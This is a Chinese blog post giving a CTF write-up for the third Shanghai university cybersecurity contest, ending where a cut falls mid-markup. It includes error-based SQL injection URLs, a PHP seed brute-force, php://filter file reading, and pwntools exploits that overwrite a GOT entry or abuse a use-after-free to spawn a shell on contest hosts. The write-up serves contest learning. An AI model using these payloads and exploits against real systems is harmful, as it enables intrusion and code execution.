<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 第三届上海市大学生网络安全大赛WriteUp · 信鑫-King's Blog</title><meta name="description" content="第三届上海市大学生网络安全大赛WriteUp - Kylin King"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://www.ycjcl.cc/atom.xml" title="信鑫-King's Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/ycjcl868" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/ycjcl868" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">第三届上海市大学生网络安全大赛WriteUp</h1><div class="post-info">Jul 8, 2018</div><div class="post-content"><blockquote>
<p>比赛时间是从 11月4日08:00 - 11月5日08:00 ，周末和 Swing 学弟、周师傅 一起打了线上，11月4号晚上还是第三，睡了一觉起来发现第6了。不过进了决赛（前20），18号可以约上海，记录下解题报告WriteUp。</p>
</blockquote>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/74718587.jpg" alt=""></p>
<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>下载app，加入圈子，查看flag</p>
<h1 id="Some-Words"><a href="#Some-Words" class="headerlink" title="Some Words"></a>Some Words</h1><p>题目拦截了union,and,=等关键字，但是没有拦截select mid from ascii等关键字，可以利用运算符进行盲注</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/33577521.jpg" alt=""></p>
<p>但是过于麻烦，可以爆错，那就试试报错注入<br><code>http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select database() limit 1,1),0x7e),1)</code> 得到当前库，然后得到表和列，最后查询flag</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/44572178.jpg" alt=""></p>
<p>得到前32位，mid一下得到后面<code>http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select%20mid(f14g,32,100) from f14g  limit 0,1),0x7e),1)</code></p>
<h1 id="classical"><a href="#classical" class="headerlink" title="classical"></a>classical</h1><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com</a></p>
<p>替换密码，在上面的链接解决，得到如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In cryptography, a classical cipher is a type of cipher that was used historically but now has fallen, for the most part, into disuse. In contrast to modern cryptographic algorithms, most classical ciphers can be practically computed and solved by hand. However, LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9 they are also usually very simple to break with modern technology. The term includes the simple systems used since Greek and Roman times, the elaborate Renaissance ciphers, World War II cryptography such as the Enigma machine and beyond. A quick brown fox jump over the lazy dog.</span><br></pre></td></tr></table></figure>
<p>其中<code>LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9</code>这串字符串应该还有一层加密，猜测是还有一层古典密码，尝试去跑凯撒<br>把凯撒的各种情况跑出来后，进行 <code>base64</code> 解码就能得到 <code>flag</code></p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/39740735.jpg" alt=""></p>
<h1 id="Welcome-To-My-Blog"><a href="#Welcome-To-My-Blog" class="headerlink" title="Welcome To My Blog"></a>Welcome To My Blog</h1><p>发现有 <code>.git</code> 目录，尝试恢复git <a href="https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/" target="_blank" rel="noopener">https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/</a><br><a href="http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/" target="_blank" rel="noopener">http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">printf</span> <span class="string">"\x1f\x8b\x08\x00\x00\x00\x00\x00"</span> | cat - 3207b7443805336f105c63c6f9948f0c9ae7a4 | gunzip | hexdump -C</span><br></pre></td></tr></table></figure>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"function.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"action"</span>]))&#123;</span><br><span class="line">  $page = $_GET[<span class="string">"action"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_exists($page.<span class="string">'.php'</span>))&#123;</span><br><span class="line">  $file = file_get_contents($page.<span class="string">".php"</span>);</span><br><span class="line">  <span class="keyword">echo</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">"action"</span>]==<span class="string">"album"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"pid"</span>]))&#123;</span><br><span class="line">     curl($_GET[<span class="string">"pid"</span>]);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现有  <code>flag.php</code>，<br>访问 <code>http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/index.php?action=flag</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"flag&#123;149922b5-27da-44b7-92b5-3c1ccfa75264&#125;"</span>;</span><br></pre></td></tr></table></figure>
<h1 id="Step-By-Step"><a href="#Step-By-Step" class="headerlink" title="Step By Step"></a>Step By Step</h1><p>顺手扫了一下文件，发现有这些文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">/index.php</span><br><span class="line">/file.php</span><br><span class="line">/flag.php</span><br><span class="line">/admin.php</span><br></pre></td></tr></table></figure>
<p>打开，<code>robots.txt</code> ，里面提示 <code>code.zip</code>  ，然后 down 下来是被 <code>phpjiami</code> 加密代码，然后解密一下，得到三个源文件 <code>index.php</code> 、 <code>admin.php</code> 、 <code>file.php</code>, 进行代码审计<br>首先看一下 <code>index.php</code>，是一个随机种子爆破的漏洞，写了一个爆破脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(‘max_execution_time’, ‘<span class="number">0</span>’);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化seed</span></span><br><span class="line">$seed = <span class="number">0</span>;</span><br><span class="line">$key = <span class="string">'填入index.php返回的key值'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth_code</span><span class="params">($length = <span class="number">12</span>, $special = true)</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    <span class="keyword">if</span> ($special) &#123;</span><br><span class="line">        $chars .= <span class="string">'!@#$%^&amp;*()'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $password = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;=<span class="number">99999</span>; $i++)&#123;</span><br><span class="line">    mt_srand($i);</span><br><span class="line">    $hash1 = auth_code(<span class="number">16</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($hash1 === $key) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"find seeds :"</span>.$i.<span class="string">"\n"</span>;</span><br><span class="line">      $seed = $i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pri = auth_code(<span class="number">10</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'private值为： '</span>.$pri;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/64377317.jpg" alt=""></p>
<p>然后发 index.php 发 post 请求，<code>private=X6B4CdeBOR</code>，此时会提示 <code>No private!</code> ，因为此时session为空，所以第一次会将private存入到session，再发送相同的请求，就会直接跳转到 <code>http://959b616a1c194d4d83f5b75a7a2f7ec6f63163b4fcbe4482.game.ichunqiu.com/admin.php?authAdmin=2017CtfY0ulike</code>。</p>
<p>再来看下 <code>admin.php</code>， 有一个 <code>json_decode($auth) == $auth_code</code> ，使用 0 进行弱类型绕过。此时出来一个表单，但是点击没有反应，查看js，使用了 ajax 进行提交，可以进行抓包。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  filename = $(<span class="string">"#filename"</span>).val();</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">'file.php'</span>,</span><br><span class="line">    type: <span class="string">'post'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      <span class="string">'id'</span>: filename,</span><br><span class="line">      <span class="string">'auth'</span>: <span class="string">'1234567890x'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    dataType: <span class="string">'text'</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result);</span><br><span class="line">    &#125;,</span><br><span class="line">    error: <span class="function"><span class="keyword">function</span>(<span class="params">XMLHttpRequest, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(XMLHttpRequest);</span><br><span class="line">      <span class="built_in">console</span>.log(textStatus);</span><br><span class="line">      <span class="built_in">console</span>.log(errorThrown);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时再看下 <code>file.php</code> ，传 id ，字符串需要包含有 <code>jpg</code> 和 满足正则 <code>preg_match(&quot;/^php:\/\/.*resource=([^|]*)/i&quot;, trim($id), $matches);</code> ，于是采用 php://filter 进行读取文件，联系到上面的 <code>flag.php</code>,于是 <code>id=php://filter/read=jpg/resource=flag.php</code>，拿到 flag</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/13290343.jpg" alt=""></p>
<h1 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h1><p>比较简单的应该逆向题目<br>运行程序，然后附加<br>这个时候已经出现了</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/55451041.jpg" alt=""></p>
<p>上面这样的字符串，我们在程序中搜索，并在关键跳转比较的地方下好断点</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/65243748.jpg" alt=""></p>
<p>可以看到一个比较字符串长度的地方</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/71910154.jpg" alt=""></p>
<p>所以我们的输入应该是长度为42的字符串</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/50494136.jpg" alt=""></p>
<p>我们的输入与 <code>this_is_not_flag</code> 按位循环异或，然后与</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66493764.jpg" alt=""></p>
<p>eax*n+401250比较，我们查看这块内存</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/4110967.jpg" alt=""></p>
<p>每一位n就会eax的值就会+1 所以刚好对应下面的42给字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">'this_is_not_flag'</span></span><br><span class="line">num = [<span class="number">0x12</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x14</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0x4a</span>, <span class="number">0x3d</span>, <span class="number">0x56</span>, <span class="number">0xa</span>, <span class="number">0x10</span>, <span class="number">0x67</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x46</span>, <span class="number">0x5a</span>, <span class="number">0x44</span>, <span class="number">0x42</span>, <span class="number">0x6e</span>, <span class="number">0xc</span>, <span class="number">0x44</span>, <span class="number">0x72</span>, <span class="number">0xc</span>, <span class="number">0xd</span>, <span class="number">0x40</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0x5f</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x4c</span>, <span class="number">0x5e</span>, <span class="number">0x5b</span>, <span class="number">0x17</span>, <span class="number">0x6e</span>, <span class="number">0xc</span>, <span class="number">0x16</span>, <span class="number">0x68</span>, <span class="number">0x5b</span>, <span class="number">0x12</span>]</span><br><span class="line"></span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">    n = i%<span class="number">16</span></span><br><span class="line">    flag += str(chr(ord(key[n])^num[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h1 id="juckcode"><a href="#juckcode" class="headerlink" title="juckcode"></a>juckcode</h1><p>类base64</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/49828264.jpg" alt=""></p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/68120400.jpg" alt=""></p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/19403609.jpg" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = file(<span class="string">'flag.enc'</span>).read().strip()</span><br><span class="line">data1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    data1 += chr(ord(i)<span class="number">-0x10</span>)</span><br><span class="line">data1 = data1.decode(<span class="string">'hex'</span>)</span><br><span class="line">bd = base64.b64encode(data1)</span><br><span class="line">t1 = string.uppercase+string.lowercase+string.digits+<span class="string">r'+/'</span></span><br><span class="line">t2=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t1:</span><br><span class="line">    t2 += chr(ord(i)<span class="number">-10</span>)</span><br><span class="line">table1 = string.maketrans(t1,t2)</span><br><span class="line">table2 = string.maketrans(t2,t1)</span><br><span class="line">bd1 = bd.translate(table1)</span><br><span class="line">s=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bd1)/<span class="number">4</span>):</span><br><span class="line">    s += bd1[<span class="number">4</span>*i]</span><br><span class="line">bd2 = s.translate(table2)</span><br><span class="line">n = <span class="number">3</span>-len(bd2)%<span class="number">3</span></span><br><span class="line">bd2 += <span class="string">'='</span>*n</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(bd2)</span><br></pre></td></tr></table></figure>
<h1 id="登机牌"><a href="#登机牌" class="headerlink" title="登机牌"></a>登机牌</h1><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/84157457.jpg" alt=""></p>
<p>在图片的末尾发现rar字样，扣出来，并且加上rar的头</p>
<p>这是一个rar压缩包，然而加密了</p>
<p>重新找线索，之前二维码利用过了，没什么其他信息，然而，条形码还没用过</p>
<p>反色扫描</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/86192358.jpg" alt=""></p>
<p>得到key 后面的数字就是密码了  解压得到flag</p>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66798604.jpg" alt=""></p>
<h1 id="list"><a href="#list" class="headerlink" title="list"></a>list</h1><p>题目比较简单，表面看是堆利用的题目，但是其实和堆没什么关系。就是把申请到的chunk的指针依次放入到一个chunk_table中，然后增加chunk数量的索引值。<br>漏洞出现在Delete函数上，<br><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/8099462.jpg" alt=""><br>可以发现，其实并没有free掉chunk，只是把之前申请到的chunk数量的索引值，做了一个简单的减法。<br>所以可以一直调用Delete函数，不断的去减少这个索引值，也就说这个索引值可以变成负数，那么就可以索引到我的chunk_table地址之前的任何一个地址。接下来调用Show函数和Edit函数就能按照索引到的这个地址存储的指针来泄漏和修改。<br><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/60393945.jpg" alt=""><br>接下来要想修改GOT表，那么需要我索引到的地址中存了一个GOT表地址，发现确实是有这种地址。<br><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/2124193.jpg" alt=""><br><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/66882215.jpg" alt=""><br>也就是说调用Delete函数263007次之后，就能索引到 0x602080 - 8*263007 =0x400588 这个地址，接下来调用Show函数和Edit函数就能泄漏libc，并且修改GOT表了。把这里改成system函数的地址就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./list'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#io = remote('106.75.8.58', 13579)</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Input your content:\n'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">263007</span>):</span><br><span class="line">    <span class="comment">#print x</span></span><br><span class="line">    Delete()</span><br><span class="line"></span><br><span class="line">Show()</span><br><span class="line">content = io.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">libc_base = u64(content.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">log.info(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">Edit(p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="p200"><a href="#p200" class="headerlink" title="p200"></a>p200</h1><p>uaf 控制指针到后门的地方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./p200"</span>)</span><br><span class="line">io=remote(<span class="string">"106.75.8.58"</span>,<span class="number">12333</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">"free\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">"free\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">"free\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Please input the length:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"48"</span>)</span><br><span class="line">io.sendline(<span class="string">"a"</span>*<span class="number">20</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">"free\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Please input the length:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"48"</span>)</span><br><span class="line">io.sendline(p64(<span class="number">0x602d90</span>)+<span class="string">"mdzzdmzxzasas"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="Is-aes-secure"><a href="#Is-aes-secure" class="headerlink" title="Is_aes_secure"></a>Is_aes_secure</h1><p>Padding oracal</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span 